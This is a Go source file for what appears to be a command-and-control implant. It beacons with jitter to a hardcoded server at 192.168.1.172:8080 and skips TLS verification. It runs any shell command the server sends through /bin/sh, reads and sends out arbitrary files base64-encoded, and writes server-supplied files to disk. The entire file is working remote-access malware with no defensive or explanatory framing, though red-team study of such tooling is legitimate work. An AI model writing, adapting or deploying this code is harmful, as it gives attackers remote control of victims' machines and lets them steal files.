package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"os"
	"encoding/base64"
	"math/rand"
	"time"
	"strings"
	"crypto/sha256"
	"crypto/tls"
	"math/big"
	"runtime"
)

const (
	ServerURL = "http://192.168.1.172:8080" 
	PollDelay = 2 * time.Second
)

type PollResponse struct {
	Status  string `json:"status"`
	Command string `json:"command"`
	Interval int    `json:"interval"` 
    Jitter   int    `json:"jitter"`   
}

type OutputPayload struct {
	ID     string `json:"id"`
	Output string `json:"output"`
}

var AgentID string


//skip ssl verify
var httpClient = &http.Client{
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    },
    Timeout: 10 * time.Second,
}


//---------

//get id
func getSystemIdentifier() string {

	// Linux /etc/machine-id 
	if data, err := os.ReadFile("/etc/machine-id"); err == nil {
		return strings.TrimSpace(string(data))
	}
	if data, err := os.ReadFile("/var/lib/dbus/machine-id"); err == nil {
		return strings.TrimSpace(string(data))
	}

	// Fallback Hostname + User
	hostname, _ := os.Hostname()
	return hostname + "_" + runtime.GOOS
}

//hash
func generate10DigitCode(input string) string {
	hash := sha256.Sum256([]byte(input))

	i := new(big.Int).SetBytes(hash[:])

	mod := new(big.Int).Exp(big.NewInt(10), big.NewInt(10), nil)
	i.Mod(i, mod)

	return fmt.Sprintf("%010d", i)
}


//---------

//ch-beacon
func calculateSleep(baseInterval int, jitterPercent int) time.Duration {
    if baseInterval <= 0 {
        baseInterval = 5
    }
    if jitterPercent <= 0 {
        return time.Duration(baseInterval) * time.Second
    }

    jitterMax := float64(baseInterval) * (float64(jitterPercent) / 100.0)
    jitterOffset := (rand.Float64() * 2 * jitterMax) - jitterMax
    finalInterval := float64(baseInterval) + jitterOffset

    if finalInterval < 1 {
        finalInterval = 1
    }
    return time.Duration(finalInterval * float64(time.Second))
}

func sendOutput(agentID string, output string) {
	outputURL := fmt.Sprintf("%s/api/agent/output", ServerURL)
	payload := OutputPayload{
		ID:     agentID,
		Output: output,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("[-] Error marshalling payload: %v\n", err)
		return
	}

	resp, err := httpClient.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("[-] Error sending output: %v\n", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("[+] Output sent back to server successfully.")
}


func main() {

	sysIdentifier := getSystemIdentifier()
	AgentID = generate10DigitCode(sysIdentifier)

	fmt.Printf("[*] Starting agent %s...\n", AgentID)
	fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)

	currentInterval := 5
    currentJitter := 0

	for {
		// poll to server ep
		pollURL := fmt.Sprintf("%s/api/agent/poll?id=%s", ServerURL, AgentID)
		resp, err := httpClient.Get(pollURL)
		if err != nil {
			fmt.Printf("[-] Error connecting to server: %v\n", err)
			time.Sleep(PollDelay)
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("[-] Error reading response: %v\n", err)
			time.Sleep(PollDelay)
			continue
		}

		var pollResp PollResponse

		if err := json.Unmarshal(body, &pollResp); err != nil {
			fmt.Printf("[-] Error parsing JSON: %v\n", err)
			time.Sleep(PollDelay)
			continue
		}

        if pollResp.Interval > 0 {
            currentInterval = pollResp.Interval
        }
        currentJitter = pollResp.Jitter




		if pollResp.Status == "task_assigned" && pollResp.Command != "" {
			fmt.Printf("[+] Received command: %s\n", pollResp.Command)


			var outputStr string

            parts := strings.SplitN(pollResp.Command, " ", 3)
            actionType := parts[0]

			if actionType == "download" && len(parts) >= 2 {
				filePath := parts[1]
				fileData, err := os.ReadFile(filePath)
				if err != nil {
					outputStr = fmt.Sprintf("[-] Error reading file: %v", err)
				} else {
					encoded := base64.StdEncoding.EncodeToString(fileData)
					outputStr = fmt.Sprintf("[DOWNLOAD_SUCCESS]|%s", encoded)
				}

				sendOutput(AgentID, outputStr)

			} else if actionType == "upload" && len(parts) >= 3 {
				destPath := parts[1]
				fileDataBase64 := parts[2]

				fileData, err := base64.StdEncoding.DecodeString(fileDataBase64)
				if err != nil {
					outputStr = fmt.Sprintf("[-] Error decoding base64: %v", err)
				} else {
					err = os.WriteFile(destPath, fileData, 0644)
					if err != nil {
						outputStr = fmt.Sprintf("[-] Error w file on disk: %v", err)
					} else {
						outputStr = fmt.Sprintf("[+] Upload completed successfully %s", destPath)
					}
				}


				sendOutput(AgentID, outputStr)

			} else{
				//exec comand 
				cmd := exec.Command("/bin/sh", "-c", pollResp.Command)
				var out bytes.Buffer
				cmd.Stdout = &out
				cmd.Stderr = &out

				err := cmd.Run()
				outputStr = out.String()
				if err != nil {
					outputStr += fmt.Sprintf("\n[-] Execution error: %v", err)
				}

				//no output
				if outputStr == "" {
					outputStr = "[+] Command executed successfully (no output)."
				}

				//send output to server
				sendOutput(AgentID, outputStr)
			}
		}

		//poll delay
		time.Sleep(calculateSleep(currentInterval, currentJitter))
	}
}


